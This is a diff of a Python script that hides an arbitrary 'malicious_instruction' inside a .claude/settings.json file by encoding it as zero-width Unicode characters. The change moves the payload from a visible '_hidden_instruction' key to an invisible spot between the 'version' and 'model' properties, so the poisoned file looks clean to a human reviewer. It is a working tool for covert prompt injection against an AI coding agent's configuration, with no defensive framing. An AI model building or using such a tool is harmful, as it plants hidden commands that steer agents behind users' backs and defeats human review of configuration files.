@@ -1,21 +1,22 @@
 #!/usr/bin/env python3
 """
-Embed zero-width Unicode into .claude/settings.json
-Version 2: Fixed encoding
+Embed zero-width Unicode between legitimate JSON properties
 """
 
-import json
 import sys
+import json
 
-ZWS = '\u200B'
-ZWNBSP = '\u200C'
-ZWJ = '\u200D'
+# Zero-width characters
+ZWS = '\u200B'      # Zero Width Space
+ZWNBSP = '\u200C'   # Zero Width Non-Joiner
 
-def embed_instruction(json_file, malicious_instruction):
-    """Read JSON, encode instruction as zero-width unicode, inject it"""
+def embed_instruction_invisibly(json_file, malicious_instruction):
+    """
+    Read clean JSON, inject zero-width Unicode BETWEEN properties
+    """
     
     with open(json_file, 'r', encoding='utf-8') as f:
-        config = json.load(f)
+        content = f.read()
     
     # Encode instruction as zero-width characters
     encoded = ''
@@ -24,10 +25,13 @@ def embed_instruction(json_file, malicious_instruction):
         for bit in format(byte, '08b'):
             encoded += ZWS if bit == '0' else ZWNBSP
     
-    # Add encoded string to config - CRITICAL: must preserve unicode
-    config['_hidden_instruction'] = encoded
+    # Inject between "version" and "model"
+    poisoned = content.replace(
+        '"version": "1.0",',
+        f'"version": "1.0"{encoded},'
+    )
     
-    return config
+    return poisoned
 
 def main():
     if len(sys.argv) < 3:
@@ -37,24 +41,17 @@ def main():
     input_file = sys.argv[1]
     instruction = sys.argv[2]
     
-    poisoned = embed_instruction(input_file, instruction)
+    poisoned = embed_instruction_invisibly(input_file, instruction)
     
     output_file = input_file.replace('.json', '_poisoned.json')
     
-    # CRITICAL: Use ensure_ascii=False to preserve unicode characters
     with open(output_file, 'w', encoding='utf-8') as f:
-        json.dump(poisoned, f, indent=2, ensure_ascii=False)
+        f.write(poisoned)
     
     print(f"[+] Poisoned config written to: {output_file}")
     print(f"[+] Hidden instruction: {instruction}")
     print(f"[+] Instruction length: {len(instruction)} chars")
     print(f"[+] Encoded length: {len(instruction) * 8} zero-width characters")
-    
-    # Verify it worked
-    with open(output_file, 'r', encoding='utf-8') as f:
-        verify = f.read()
-    zw_count = verify.count(ZWS) + verify.count(ZWNBSP) + verify.count(ZWJ)
-    print(f"[✓] Verification: {zw_count} zero-width characters found in output file")
 
 if __name__ == '__main__':
     main()
